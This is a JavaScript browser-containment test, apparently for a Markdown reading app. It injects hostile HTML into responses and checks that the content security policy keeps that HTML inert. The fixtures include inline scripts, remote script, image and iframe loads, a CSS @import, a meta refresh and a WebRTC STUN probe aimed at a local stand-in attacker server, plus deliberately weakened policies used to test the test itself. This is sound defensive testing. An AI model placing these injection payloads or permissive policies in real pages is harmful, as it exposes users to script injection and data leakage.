// Browser containment lock for authored Markdown HTML, the first-party reading
// shell, and verbatim report HTML. It starts a controlled second origin rather
// than inferring privacy from DOM shape: a green run means the hostile fixtures
// caused zero requests there while the application module still ran and
// agent-authored report scripts and automatic navigation stayed inert.
//
// Env: YOMIHON_BASE and MUTATE. MUTATE=list prints the watched-red modes.
import { createSocket } from "node:dgram";
import { createServer } from "node:http";

import { chromium } from "playwright-core";

const BASE = process.env.YOMIHON_BASE || "http://127.0.0.1:9610";
const READING_PATH = "/notes/Notes/browser-boundary.md";
const REPORT_PATH = "/reports/browser-boundary.html/raw";
const MUTATE = process.env.MUTATE || "";
const ATTACKER_TOKEN = "BROWSER_BOUNDARY_ATTACKER";
const STUN_TOKEN = "BROWSER_BOUNDARY_STUN";

const SITES = [
	"authored-markup-inert",
	"authored-remote-resource-explicit",
	"response-nonce-bound",
	"application-runtime-survives",
	"reading-csp-defense-in-depth",
	"report-static-content-preserved",
	"report-script-inert",
	"report-refresh-inert",
	"report-resource-zero-network",
	"report-webrtc-zero-network",
];

const MUTATIONS = {
	"activate-authored-script": {
		target: "authored-markup-inert",
		phase: "reading",
	},
	"restore-authored-remote-image": {
		target: "authored-remote-resource-explicit",
		phase: "reading",
	},
	"mismatch-response-nonce": {
		target: "response-nonce-bound",
		phase: "reading",
	},
	"break-application-entry": {
		target: "application-runtime-survives",
		phase: "reading",
	},
	"weaken-reading-csp": {
		target: "reading-csp-defense-in-depth",
		phase: "bypass",
	},
	"strip-report-static-content": {
		target: "report-static-content-preserved",
		phase: "report",
	},
	"enable-report-script": { target: "report-script-inert", phase: "report" },
	"enable-report-refresh": { target: "report-refresh-inert", phase: "report" },
	"weaken-report-resource-policy": {
		target: "report-resource-zero-network",
		phase: "report",
	},
	"enable-report-webrtc": {
		target: "report-webrtc-zero-network",
		phase: "report",
	},
};

class LockFired extends Error {
	constructor(site, message) {
		super(message);
		this.site = site;
	}
}
class ProbeBroken extends Error {}
class NotApplied extends Error {}

const fail = (site, message) => {
	if (!SITES.includes(site))
		throw new ProbeBroken(
			`BROKEN browser-boundary: unknown assertion site ${site}`,
		);
	throw new LockFired(site, `FAIL browser-boundary: ${message}`);
};
const broken = (message) => {
	throw new ProbeBroken(`BROKEN browser-boundary: ${message}`);
};
const notApplied = (message) => {
	throw new NotApplied(`NOT-APPLIED browser-boundary: ${message}`);
};
const occurrences = (body, needle) => body.split(needle).length - 1;

for (const [name, mutation] of Object.entries(MUTATIONS)) {
	if (!SITES.includes(mutation.target)) {
		console.error(
			`browser-boundary: mutation ${name} aims at unknown site ${mutation.target}`,
		);
		process.exit(2);
	}
}
for (const site of SITES) {
	if (!Object.values(MUTATIONS).some((mutation) => mutation.target === site)) {
		console.error(`browser-boundary: assertion site ${site} has no mutation`);
		process.exit(2);
	}
}

if (MUTATE === "list") {
	for (const name of Object.keys(MUTATIONS)) console.log(name);
	process.exit(0);
}
if (MUTATE && !Object.hasOwn(MUTATIONS, MUTATE)) {
	console.error(`browser-boundary: unknown MUTATE mode ${MUTATE}`);
	process.exit(2);
}

const mutationFor = (phase) => MUTATE && MUTATIONS[MUTATE].phase === phase;

const startAttacker = async () => {
	const requests = [];
	const stunPackets = [];
	const server = createServer((request, response) => {
		requests.push(request.url || "/");
		response.setHeader("Access-Control-Allow-Origin", "*");
		if (request.url === "/remote-script") {
			response.setHeader("Content-Type", "application/javascript");
			response.end("globalThis.injectedRemoteScriptRan=true;");
			return;
		}
		if (request.url?.includes("image")) {
			response.setHeader("Content-Type", "image/gif");
			response.end(
				Buffer.from("R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=", "base64"),
			);
			return;
		}
		response.statusCode = 204;
		response.end();
	});
	const stun = createSocket("udp4");
	stun.on("message", (packet) => stunPackets.push(packet.length));
	let stunBound = false;
	const close = async () => {
		const closers = [];
		if (server.listening) {
			closers.push(
				new Promise((resolve, reject) =>
					server.close((error) => (error ? reject(error) : resolve())),
				),
			);
		}
		if (stunBound) {
			closers.push(new Promise((resolve) => stun.close(resolve)));
		}
		const results = await Promise.allSettled(closers);
		const errors = results
			.filter((result) => result.status === "rejected")
			.map((result) => result.reason);
		if (errors.length !== 0) {
			throw new AggregateError(errors, "close controlled attacker resources");
		}
	};
	try {
		await new Promise((resolve, reject) => {
			server.once("error", reject);
			server.listen(0, "127.0.0.1", resolve);
		});
		await new Promise((resolve, reject) => {
			stun.once("error", reject);
			stun.bind(0, "127.0.0.1", () => {
				stunBound = true;
				resolve();
			});
		});
	} catch (error) {
		await close();
		throw error;
	}
	const address = server.address();
	if (!address || typeof address === "string") {
		await close();
		broken("controlled second origin has no TCP address");
	}
	const stunAddress = stun.address();
	if (!stunAddress || typeof stunAddress === "string") {
		await close();
		broken("controlled STUN sink has no UDP address");
	}
	return {
		authority: `127.0.0.1:${address.port}`,
		stunAuthority: `127.0.0.1:${stunAddress.port}`,
		requests,
		stunPackets,
		reset() {
			requests.length = 0;
			stunPackets.length = 0;
		},
		close,
	};
};

const weakenedReadingPolicy = () =>
	`default-src * data: blob: 'unsafe-inline'; base-uri *; connect-src *; font-src * data:; ` +
	`form-action *; frame-ancestors 'none'; frame-src *; img-src * data: blob:; media-src *; ` +
	`object-src *; script-src * 'unsafe-inline'; style-src * 'unsafe-inline'; worker-src *`;

const executableReportPolicy =
	"sandbox allow-scripts; default-src 'none'; base-uri 'none'; connect-src 'none'; " +
	"font-src data:; form-action 'none'; frame-ancestors 'self'; frame-src 'none'; " +
	"img-src data:; media-src data:; object-src 'none'; " +
	"script-src 'unsafe-inline'; script-src-attr 'unsafe-inline'; " +
	"style-src 'unsafe-inline'; worker-src 'none'";

const weakenedReportResourcePolicy =
	"default-src 'none'; base-uri 'none'; connect-src 'none'; " +
	"font-src data:; form-action 'none'; frame-ancestors 'self'; frame-src 'none'; " +
	`img-src ${BASE} data:; media-src data:; object-src 'none'; ` +
	"script-src 'none'; script-src-attr 'none'; " +
	"style-src 'unsafe-inline'; worker-src 'none'";

const installReadingResponse = async (page, attacker, phase) => {
	const proof = { requests: 0, attackerTokens: 0, mutationMatches: 0, csp: "" };
	await page.route(BASE + READING_PATH, async (route) => {
		proof.requests += 1;
		const response = await route.fetch();
		const original = await response.text();
		proof.csp = response.headers()["content-security-policy"] || "";
		proof.attackerTokens = occurrences(original, ATTACKER_TOKEN);
		let body = original.replaceAll(ATTACKER_TOKEN, attacker.authority);
		let headers;

		if (phase === "reading" && mutationFor(phase)) {
			switch (MUTATE) {
				case "activate-authored-script": {
					const needle =
						"&lt;script&gt;globalThis.noteScriptRan=true&lt;/script&gt;";
					proof.mutationMatches = occurrences(body, needle);
					body = body.replace(
						needle,
						"<script>globalThis.noteScriptRan=true</script>",
					);
					break;
				}
				case "restore-authored-remote-image": {
					const needle = `<a href="http://${attacker.authority}/markdown-image" rel="external noreferrer" referrerpolicy="no-referrer">remote pixel</a>`;
					proof.mutationMatches = occurrences(body, needle);
					body = body.replace(
						needle,
						`<img src="http://${attacker.authority}/markdown-image" alt="remote pixel">`,
					);
					break;
				}
				case "mismatch-response-nonce": {
					const needle = /<script nonce="[^"]+" type="module"/g;
					proof.mutationMatches = [...body.matchAll(needle)].length;
					body = body.replace(
						needle,
						'<script nonce="wrong-response-nonce" type="module"',
					);
					break;
				}
				case "break-application-entry": {
					const needle = 'src="/static/yomihon.js"';
					proof.mutationMatches = occurrences(body, needle);
					body = body.replace(
						needle,
						'src="/static/missing-browser-boundary.js"',
					);
					break;
				}
				default:
					break;
			}
		}

		if (phase === "bypass") {
			const needle = "<p>BROWSER-BOUNDARY-END</p>";
			const injected = [
				"<script>globalThis.injectedInlineRan=true</script>",
				'<button onclick="globalThis.injectedEventRan=true">injected event</button>',
				`<script src="http://${attacker.authority}/remote-script"></script>`,
				'<script src="/static/yomihon.js?hostile-boundary"></script>',
				`<img src="http://${attacker.authority}/image">`,
				`<link rel="prefetch" href="http://${attacker.authority}/prefetch">`,
				`<iframe src="http://${attacker.authority}/frame"></iframe>`,
				`<video poster="http://${attacker.authority}/poster"><source src="http://${attacker.authority}/media"></video>`,
				`<style>@import url("http://${attacker.authority}/import");.injected{background:url("http://${attacker.authority}/style")}</style>`,
			].join("");
			const matches = occurrences(body, needle);
			if (matches !== 1)
				broken(`bypass injection marker matched ${matches}, want exactly 1`);
			body = body.replace(needle, needle + injected);
			if (mutationFor(phase)) {
				proof.mutationMatches = proof.csp ? 1 : 0;
				headers = response.headers();
				headers["content-security-policy"] = weakenedReadingPolicy();
				delete headers["content-length"];
				delete headers["content-encoding"];
			}
		}

		if (headers) await route.fulfill({ response, body, headers });
		else await route.fulfill({ response, body });
	});
	return proof;
};

const installReportResponse = async (page, attacker) => {
	const proof = {
		requests: 0,
		attackerTokens: 0,
		mutationMatches: 0,
		csp: "",
		deliveredCsp: "",
		stimuli: {},
	};
	await page.route(BASE + REPORT_PATH, async (route) => {
		proof.requests += 1;
		const response = await route.fetch();
		const original = await response.text();
		proof.csp = response.headers()["content-security-policy"] || "";
		proof.attackerTokens =
			occurrences(original, ATTACKER_TOKEN) + occurrences(original, STUN_TOKEN);
		proof.stimuli = {
			script: occurrences(original, "dataset.inlineReport = 'ran'"),
			refresh: occurrences(original, `${ATTACKER_TOKEN}/report-refresh`),
			style: occurrences(original, `${ATTACKER_TOKEN}/report-style`),
			prefetch: occurrences(original, `${ATTACKER_TOKEN}/report-prefetch`),
			image: occurrences(original, `${ATTACKER_TOKEN}/report-image`),
			fetch: occurrences(original, `${ATTACKER_TOKEN}/report-fetch`),
			webrtc: occurrences(original, STUN_TOKEN),
		};
		let body = original
			.replaceAll(ATTACKER_TOKEN, attacker.authority)
			.replaceAll(STUN_TOKEN, attacker.stunAuthority);
		if (mutationFor("report")) {
			const headers = response.headers();
			let expectedCsp = reportPolicy;
			let bodyMatches = 0;
			switch (MUTATE) {
				case "strip-report-static-content": {
					const needle =
						'<p id="self-contained-report">Self-contained report</p>';
					bodyMatches = occurrences(body, needle);
					body = body.replace(needle, "");
					break;
				}
				case "enable-report-script":
					expectedCsp = executableReportPolicy;
					headers["content-security-policy"] = executableReportPolicy;
					body =
						"<!doctype html><html data-report-mutation=\"enable-report-script\"><script>document.documentElement.dataset.inlineReport='ran'</script></html>";
					bodyMatches = occurrences(
						body,
						'data-report-mutation="enable-report-script"',
					);
					break;
				case "enable-report-refresh":
					expectedCsp = executableReportPolicy;
					headers["content-security-policy"] = executableReportPolicy;
					body = `<!doctype html><html data-report-mutation="enable-report-refresh"><meta http-equiv="refresh" content="0;url=http://${attacker.authority}/report-refresh"></html>`;
					bodyMatches = occurrences(
						body,
						'data-report-mutation="enable-report-refresh"',
					);
					break;
				case "weaken-report-resource-policy":
					expectedCsp = weakenedReportResourcePolicy;
					headers["content-security-policy"] = weakenedReportResourcePolicy;
					body = `<!doctype html><html data-report-mutation="weaken-report-resource-policy"><img data-report-resource-mutation src="${BASE}/browser-boundary-report-image" alt=""></html>`;
					bodyMatches = occurrences(
						body,
						'data-report-mutation="weaken-report-resource-policy"',
					);
					break;
				case "enable-report-webrtc":
					expectedCsp = executableReportPolicy;
					headers["content-security-policy"] = executableReportPolicy;
					body = `<!doctype html><html data-report-mutation="enable-report-webrtc"><script>
const peer = new RTCPeerConnection({iceServers: [{urls: "stun:${attacker.stunAuthority}"}]});
peer.createDataChannel("probe");
peer.createOffer().then((offer) => peer.setLocalDescription(offer));
</script></html>`;
					bodyMatches = occurrences(
						body,
						'data-report-mutation="enable-report-webrtc"',
					);
					break;
				default:
					broken(`missing report mutation body for ${MUTATE}`);
			}
			proof.deliveredCsp = headers["content-security-policy"] || "";
			proof.mutationMatches =
				proof.csp === reportPolicy &&
				proof.deliveredCsp === expectedCsp &&
				bodyMatches === 1
					? 1
					: 0;
			delete headers["content-length"];
			delete headers["content-encoding"];
			await route.fulfill({ response, body, headers });
			return;
		}
		proof.deliveredCsp = proof.csp;
		await route.fulfill({ response, body });
	});
	return proof;
};

const proveResponseRoute = (proof, phase) => {
	if (proof.requests !== 1)
		broken(
			`${phase} document was requested ${proof.requests} times, want exactly 1`,
		);
	if (proof.attackerTokens === 0)
		broken(`${phase} fixture contains no ${ATTACKER_TOKEN} tokens`);
	if (mutationFor(phase) && proof.mutationMatches !== 1) {
		notApplied(
			`${MUTATE} matched ${proof.mutationMatches} production sites, want exactly 1`,
		);
	}
};

const reportPolicy =
	"sandbox; default-src 'none'; base-uri 'none'; connect-src 'none'; " +
	"font-src data:; form-action 'none'; frame-ancestors 'self'; frame-src 'none'; " +
	"img-src data:; media-src data:; object-src 'none'; " +
	"script-src 'none'; script-src-attr 'none'; " +
	"style-src 'unsafe-inline'; worker-src 'none'";

let browser;
let attacker;
try {
	browser = await chromium.launch({ channel: "chrome", headless: true });
	attacker = await startAttacker();
	// Case 1: the renderer grants only the ruled inert subset, binds every app
	// script to the response nonce, and leaves ordinary app interactions alive.
	{
		attacker.reset();
		const context = await browser.newContext({
			viewport: { width: 1280, height: 800 },
		});
		const page = await context.newPage();
		const proof = await installReadingResponse(page, attacker, "reading");
		await page.goto(BASE + READING_PATH, { waitUntil: "domcontentloaded" });
		proveResponseRoute(proof, "reading");

		const prose = page.locator(".y-prose");
		if ((await prose.count()) !== 1)
			broken(
				`reading page has ${await prose.count()} .y-prose regions, want 1`,
			);
		if (
			(await prose.locator('ruby[lang="ja"] > rt[lang="ja"]').count()) !== 1 ||
			(await prose.locator("br").count()) !== 1
		) {
			fail(
				"authored-markup-inert",
				"the ruled ruby/rt/br subset did not survive rendering",
			);
		}
		const activeAuthored = await prose
			.locator(
				"script,meta,button[onclick],link,iframe,form,video,source,style",
			)
			.count();
		const proseText = await prose.textContent();
		if (
			activeAuthored !== 0 ||
			!proseText.includes("globalThis.noteScriptRan=true")
		) {
			fail(
				"authored-markup-inert",
				`authored active-element count=${activeAuthored}, script source visible=${proseText.includes("globalThis.noteScriptRan=true")}`,
			);
		}

		const remoteLink = prose.locator(
			`a[href="http://${attacker.authority}/markdown-image"]`,
		);
		if (
			(await remoteLink.count()) !== 1 ||
			(await remoteLink.textContent()) !== "remote pixel"
		) {
			fail(
				"authored-remote-resource-explicit",
				"the remote Markdown image is not one explicit external link",
			);
		}
		await page.waitForTimeout(250);
		if (attacker.requests.length !== 0) {
			fail(
				"authored-remote-resource-explicit",
				`authored content made automatic requests: ${attacker.requests.join(", ")}`,
			);
		}

		const nonceMatch = proof.csp.match(
			/script-src 'nonce-([^']+)' 'strict-dynamic'/,
		);
		const scripts = await page
			.locator("script")
			.evaluateAll((elements) => elements.map((element) => element.nonce));
		if (
			!nonceMatch ||
			scripts.length < 2 ||
			scripts.some((nonce) => nonce !== nonceMatch[1]) ||
			!proof.csp.includes("script-src-attr 'none'") ||
			proof.csp.includes("script-src 'self'")
		) {
			fail(
				"response-nonce-bound",
				`CSP/scripts disagree: csp=${JSON.stringify(proof.csp)}, script nonces=${JSON.stringify(scripts)}`,
			);
		}

		await page
			.waitForFunction(
				() => document.documentElement.dataset.js === "on",
				null,
				{ timeout: 2000 },
			)
			.catch(() => {});
		const filterHidden = await page
			.locator("[data-nav-filter]")
			.getAttribute("hidden");
		if (
			(await page.evaluate(() => document.documentElement.dataset.js)) !==
				"on" ||
			filterHidden !== null
		) {
			fail(
				"application-runtime-survives",
				`module boot/filter reveal failed: data-js=${await page.evaluate(() => document.documentElement.dataset.js)}, hidden=${filterHidden}`,
			);
		}
		await page.locator("[data-search-open]").click();
		if (
			!(await page.locator("[data-search]").evaluate((dialog) => dialog.open))
		) {
			fail(
				"application-runtime-survives",
				"the nonce-authorized module did not upgrade the search link into a dialog",
			);
		}
		await context.close();
	}

	// Case 2: inject active markup after the renderer. This does not excuse a
	// renderer regression; it independently proves CSP stops execution and all
	// automatic fetches if markup reaches the response through a future bug.
	{
		attacker.reset();
		const context = await browser.newContext({
			viewport: { width: 1280, height: 800 },
		});
		const page = await context.newPage();
		const sameOriginHostileResponses = [];
		page.on("response", (response) => {
			if (response.url().includes("hostile-boundary"))
				sameOriginHostileResponses.push(response.url());
		});
		const proof = await installReadingResponse(page, attacker, "bypass");
		await page.goto(BASE + READING_PATH, { waitUntil: "domcontentloaded" });
		proveResponseRoute(proof, "bypass");
		await page.waitForTimeout(300);
		const state = await page.evaluate(() => ({
			inline: globalThis.injectedInlineRan === true,
			event: globalThis.injectedEventRan === true,
			remote: globalThis.injectedRemoteScriptRan === true,
			app: document.documentElement.dataset.js,
		}));
		if (
			state.inline ||
			state.event ||
			state.remote ||
			state.app !== "on" ||
			attacker.requests.length !== 0 ||
			sameOriginHostileResponses.length !== 0
		) {
			fail(
				"reading-csp-defense-in-depth",
				`injected state=${JSON.stringify(state)}, attacker=${JSON.stringify(attacker.requests)}, unnonced-self-responses=${JSON.stringify(sameOriginHostileResponses)}`,
			);
		}
		await context.close();
	}

	// Case 3: verbatim report bytes render as static HTML/CSS/SVG, while authored
	// scripts, automatic navigation, ordinary remote resources, and WebRTC stay
	// inert. This is the report contract, not the reading renderer's allowlist.
	{
		attacker.reset();
		const context = await browser.newContext({
			viewport: { width: 1280, height: 800 },
		});
		const page = await context.newPage();
		const reportResourceRequests = [];
		page.on("request", (request) => {
			if (request.url() === BASE + "/browser-boundary-report-image") {
				reportResourceRequests.push(request.url());
			}
		});
		const proof = await installReportResponse(page, attacker);
		await page.goto(BASE + REPORT_PATH, { waitUntil: "domcontentloaded" });
		proveResponseRoute(proof, "report");
		for (const [stimulus, count] of Object.entries(proof.stimuli)) {
			if (count !== 1) {
				broken(
					`report fixture ${stimulus} stimulus occurs ${count} times, want exactly 1`,
				);
			}
		}
		if (proof.csp !== reportPolicy) {
			fail(
				"report-script-inert",
				`report CSP=${JSON.stringify(proof.csp)}, want=${JSON.stringify(reportPolicy)}`,
			);
		}
		await page.waitForTimeout(700);
		if (!MUTATE || MUTATE === "strip-report-static-content") {
			const staticReport = await page.evaluate(() => ({
				text: document.querySelector("#self-contained-report")?.textContent,
				color: getComputedStyle(document.body).color,
				circle: document.querySelectorAll("#self-contained-svg circle").length,
				dataImageWidth: document.querySelector("#self-contained-data-image")
					?.naturalWidth,
			}));
			if (
				staticReport.text !== "Self-contained report" ||
				staticReport.color !== "rgb(12, 34, 56)" ||
				staticReport.circle !== 1 ||
				staticReport.dataImageWidth !== 1
			) {
				fail(
					"report-static-content-preserved",
					`static report state=${JSON.stringify(staticReport)}`,
				);
			}
		}
		if (
			MUTATE === "weaken-report-resource-policy" &&
			(await page.locator("[data-report-resource-mutation]").count()) !== 1
		) {
			notApplied("the isolated remote-resource mutation body did not render");
		}
		const inlineRan = await page.evaluate(
			() => document.documentElement.dataset.inlineReport === "ran",
		);
		if (inlineRan) {
			fail(
				"report-script-inert",
				`authored report script ran under ${JSON.stringify(proof.deliveredCsp)}`,
			);
		}
		const refreshes = attacker.requests.filter(
			(request) => request === "/report-refresh",
		);
		if (refreshes.length !== 0) {
			fail(
				"report-refresh-inert",
				`authored refresh navigated to ${JSON.stringify(refreshes)}`,
			);
		}
		if (attacker.requests.length !== 0 || reportResourceRequests.length !== 0) {
			fail(
				"report-resource-zero-network",
				`report made HTTP requests: second-origin=${JSON.stringify(attacker.requests)}, same-origin=${JSON.stringify(reportResourceRequests)}`,
			);
		}
		if (attacker.stunPackets.length !== 0) {
			fail(
				"report-webrtc-zero-network",
				`report emitted STUN packet lengths ${JSON.stringify(attacker.stunPackets)}`,
			);
		}
		await context.close();
	}

	console.log(
		"PASS browser-boundary: authored markup is inert, app nonces work, and reading/report surfaces made zero second-origin requests",
	);
} catch (error) {
	if (error instanceof NotApplied) {
		console.error(error.message);
		console.log(`MUTATE-RESULT: not-applied ${MUTATE}`);
		process.exitCode = 2;
	} else if (error instanceof LockFired) {
		console.error(error.message);
		if (MUTATE) {
			const { target } = MUTATIONS[MUTATE];
			if (error.site === target) console.log(`MUTATE-RESULT: caught ${MUTATE}`);
			else
				console.error(
					`no catch: ${MUTATE} targets ${target}, but ${error.site} fired first`,
				);
		}
		process.exitCode = 1;
	} else if (error instanceof ProbeBroken) {
		console.error(error.message);
		process.exitCode = 1;
	} else {
		console.error(error);
		process.exitCode = 1;
	}
} finally {
	const closers = [];
	if (browser) closers.push(browser.close());
	if (attacker) closers.push(attacker.close());
	const results = await Promise.allSettled(closers);
	for (const result of results) {
		if (result.status === "rejected") {
			console.error("browser-boundary cleanup failed", result.reason);
			process.exitCode = 1;
		}
	}
}
